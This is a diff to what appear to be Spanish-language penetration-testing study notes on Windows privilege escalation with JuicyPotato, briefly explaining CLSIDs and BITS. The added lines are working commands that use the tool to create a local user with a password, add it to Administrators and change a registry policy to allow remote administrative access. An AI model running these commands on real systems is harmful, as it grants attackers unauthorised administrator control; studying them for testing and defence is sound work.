@@ -2547,10 +2547,14 @@ Esta es una herramienta donde puedes escalar privilegios si esta el SetImpersona
 ```
 En el contexto de Windows, el CLSID (Class ID o Identificador de Clase) es un identificador único globalmente para una clase de objetos COM (Component Object Model). En el caso específico que mencionas, BITS se refiere a Background Intelligent Transfer Service, que es un servicio de Windows utilizado para la transferencia de archivos en segundo plano, comúnmente utilizado por Windows Update y otros servicios.
 
-.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar password123. /add"
 
 
 .\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar password123. /add" -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"
+
+
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators  s4vitar /add" -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
+
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
 
 ```
 
